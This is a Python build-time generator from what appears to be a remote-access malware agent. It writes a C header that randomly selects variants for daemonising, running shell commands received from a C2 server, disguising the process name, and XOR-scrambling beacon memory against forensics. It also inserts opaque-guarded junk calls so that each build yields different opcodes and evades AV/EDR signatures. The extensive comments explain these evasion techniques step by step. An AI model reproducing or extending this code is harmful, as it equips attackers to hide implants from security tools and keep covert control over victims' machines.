#!/usr/bin/env python3
"""
gen_poly_cfg.py — Build-time polymorphic configuration generator
=================================================================

PURPOSE
-------
This script generates ``poly_cfg.h``, a C header that selects WHICH
implementation of several key agent behaviours gets compiled into the
binary.

WHAT IS POLYMORPHISM (IN THE MALWARE SENSE)?
--------------------------------------------
In security, a "polymorphic" binary is one that changes its shape on
every compile without changing what it does.  The agent has multiple
ways to perform the same task (e.g. three different ways to fork into
the background).  Each way produces different x86_64 machine code:
different opcodes, different system call sequences, different register
usage patterns.

Because AV/EDR signature engines match patterns of bytes (opcodes),
code that does the same thing but compiles to completely different bytes
defeats byte-level signatures.  This is the core idea behind
polymorphism: same behaviour, different binary shape, every build.

WHAT DO THE POLY_* SELECTORS CONTROL?
--------------------------------------

  POLY_DAEMON (1, 2, or 3)
      How the agent detaches from its parent process and becomes a
      background daemon:
        1 = double-fork   : fork twice; intermediate parent exits;
                            grandchild is re-parented to init (PID 1)
        2 = signal-first+umask : set signal handlers before fork,
                                  then call setsid() and umask()
        3 = raw-fork-syscall   : call the fork system call number
                                  directly instead of using the libc
                                  wrapper (avoids libc hooking by EDRs)

  POLY_EXEC_CMD (1, 2, or 3)
      How the agent launches shell commands it receives from the C2:
        1 = execl          : execl("/bin/sh", "sh", "-c", cmd, NULL)
        2 = execve+argv    : build argv[] array, call execve() directly
        3 = execlp         : execlp("sh", "sh", "-c", cmd, NULL)
                             (searches $PATH for "sh")

  POLY_HIDE_NAME (1, 2, or 3)
      How the agent disguises its process name (what shows up in ``ps``):
        1 = prctl+argv0   : use prctl(PR_SET_NAME, ...) AND overwrite
                            argv[0] in the process's argument list
        2 = prctl-only    : use only prctl(PR_SET_NAME, ...)
        3 = comm-write+argv0 : write directly to /proc/self/comm
                               (bypasses prctl) AND overwrite argv[0]

  POLY_SILENTPULSE (1, 2, or 3)
      How the "heartbeat" region of memory is handled — the agent
      periodically XOR-scrambles a memory region containing its
      next beacon timestamp to frustrate memory forensics:
        1 = xor+mprotect-rw   : XOR the region, then change its
                                  permissions to read-write
        2 = xor+mprotect-none : XOR the region, then make it
                                  inaccessible (PROT_NONE) between
                                  beacons — harder to read from a
                                  memory dump
        3 = xor+madvise       : XOR the region, then call madvise()
                                  with MADV_DONTNEED to hint that the
                                  kernel may discard the pages

WHAT IS POLY_DEAD_CONST?
-------------------------
``POLY_DEAD_CONST`` is a random non-zero 32-bit integer baked into the
binary at build time.  It is used in poly_stubs.h as the right-hand side
of a comparison:

    if (g_aid_hash == POLY_DEAD_CONST) { /* call junk functions */ }

``g_aid_hash`` is a runtime value that is never equal to POLY_DEAD_CONST
(it starts at 0 and is derived from ECDH key exchange — the probability
of accidentally equalling a random 32-bit constant is 1 in 4 billion).
So the block is NEVER executed.

BUT: because the compiler cannot prove at compile time that
``g_aid_hash != POLY_DEAD_CONST`` (g_aid_hash is a global variable that
changes at runtime), it must emit real CALL instructions for the junk
functions.  This is called a "runtime-opaque guard" — opaque to the
compiler, transparent to us.

WHY MUST POLY_DEAD_CONST BE NON-ZERO?
``g_aid_hash`` is initialised to 0 before the first key exchange.  If
POLY_DEAD_CONST were 0, the guard ``g_aid_hash == 0`` would be TRUE
before the first ECDH round, and all the junk functions WOULD execute,
causing incorrect behaviour.  The ``| 1`` in ``(rb() | 1)`` forces the
lowest bit to 1, guaranteeing the constant is never 0.

Usage: python3 gen_poly_cfg.py [output_path]
"""
import os
import sys


def rb() -> int:
    """
    Return a cryptographically random 32-bit unsigned integer.

    os.urandom(4) reads 4 bytes from /dev/urandom (the OS's entropy pool).
    int.from_bytes(..., 'little') interprets those 4 bytes as a little-endian
    unsigned 32-bit integer (least-significant byte first).
    """
    return int.from_bytes(os.urandom(4), 'little')


def rn(lo: int, hi: int) -> int:
    """
    Return a random integer in the closed range [lo, hi] (inclusive on both ends).

    Uses rb() as the entropy source so all values come from /dev/urandom.
    The modulo operation maps the full 32-bit range into [0, hi-lo] and then
    shifts it to [lo, hi].  For small ranges (like 1-3) the modulo bias is
    negligible.
    """
    return lo + (rb() % (hi - lo + 1))


def rc(choices: list):
    """
    Return a uniformly random element from the given list.

    rb() % len(choices) gives a random index; for short lists the bias is tiny.
    """
    return choices[rb() % len(choices)]


# ── Determine output file path ─────────────────────────────────────────────────
# The Makefile can pass the path as the first argument; otherwise default to
# the conventional project layout path.
out = sys.argv[1] if len(sys.argv) > 1 else "src/poly_cfg.h"

# ── Pick random values for each polymorphic selector ──────────────────────────
POLY_DAEMON       = rn(1, 3)   # one of three daemonisation strategies
POLY_EXEC_CMD     = rn(1, 3)   # one of three command-execution strategies
POLY_HIDE_NAME    = rn(1, 3)   # one of three process-name-hiding strategies
POLY_SILENTPULSE  = rn(1, 3)   # one of three heartbeat-memory-protection strategies

# POLY_DEAD_CONST: random 32-bit non-zero integer used as the junk-function guard.
# rb() gives a random 32-bit integer; | 1 forces the lowest bit to 1, ensuring
# the result is never 0 (which would accidentally fire the guard before ECDH).
# & 0xFFFFFFFF clips to unsigned 32-bit range (rb() already returns 32 bits,
# but this is explicit documentation of intent).
POLY_DEAD_CONST   = (rb() | 1) & 0xFFFFFFFF   # always non-zero

# ── Human-readable descriptions for the console log ───────────────────────────
# These strings explain which variant was picked in plain English, helping
# a developer reviewing the build log understand what got compiled in.
desc = {
    'POLY_DAEMON':      {1:'double-fork', 2:'signal-first+umask', 3:'raw-fork-syscall'},
    'POLY_EXEC_CMD':    {1:'execl', 2:'execve+argv', 3:'execlp'},
    'POLY_HIDE_NAME':   {1:'prctl+argv0', 2:'prctl-only', 3:'comm-write+argv0'},
    'POLY_SILENTPULSE': {1:'xor+mprotect-rw', 2:'xor+mprotect-none', 3:'xor+madvise'},
}

# ── Write the generated header ─────────────────────────────────────────────────
with open(out, 'w') as f:
    f.write("/* poly_cfg.h — generated by gen_poly_cfg.py — do not edit\n")
    f.write(" * Each 'make poly' produces a different build with different compiled opcodes.\n")
    f.write(" * POLY_* selects which implementation variant to compile into agent.c.\n")
    f.write(" */\n")
    f.write("#ifndef POLY_CFG_H\n")    # include guard: prevent double-inclusion
    f.write("#define POLY_CFG_H\n\n")

    # Write each selector with a comment describing the chosen variant.
    f.write(f"/* {desc['POLY_DAEMON'][POLY_DAEMON]} */\n")
    f.write(f"#define POLY_DAEMON       {POLY_DAEMON}\n\n")

    f.write(f"/* {desc['POLY_EXEC_CMD'][POLY_EXEC_CMD]} */\n")
    f.write(f"#define POLY_EXEC_CMD     {POLY_EXEC_CMD}\n\n")

    f.write(f"/* {desc['POLY_HIDE_NAME'][POLY_HIDE_NAME]} */\n")
    f.write(f"#define POLY_HIDE_NAME    {POLY_HIDE_NAME}\n\n")

    f.write(f"/* {desc['POLY_SILENTPULSE'][POLY_SILENTPULSE]} */\n")
    f.write(f"#define POLY_SILENTPULSE  {POLY_SILENTPULSE}\n\n")

    # POLY_DEAD_CONST is written as an unsigned decimal literal (the U suffix
    # tells the C compiler to treat it as unsigned int, avoiding sign issues
    # with values above 0x7FFFFFFF).
    f.write(f"/* non-zero seed used by poly_stubs.h dead branches */\n")
    f.write(f"#define POLY_DEAD_CONST   {POLY_DEAD_CONST}U\n\n")

    f.write("#endif /* POLY_CFG_H */\n")  # close the include guard

# ── Console summary ───────────────────────────────────────────────────────────
print(f"[*] poly_cfg.h: DAEMON={POLY_DAEMON}({desc['POLY_DAEMON'][POLY_DAEMON]}) "
      f"EXEC={POLY_EXEC_CMD}({desc['POLY_EXEC_CMD'][POLY_EXEC_CMD]}) "
      f"HIDE={POLY_HIDE_NAME}({desc['POLY_HIDE_NAME'][POLY_HIDE_NAME]}) "
      f"SP={POLY_SILENTPULSE}({desc['POLY_SILENTPULSE'][POLY_SILENTPULSE]})")
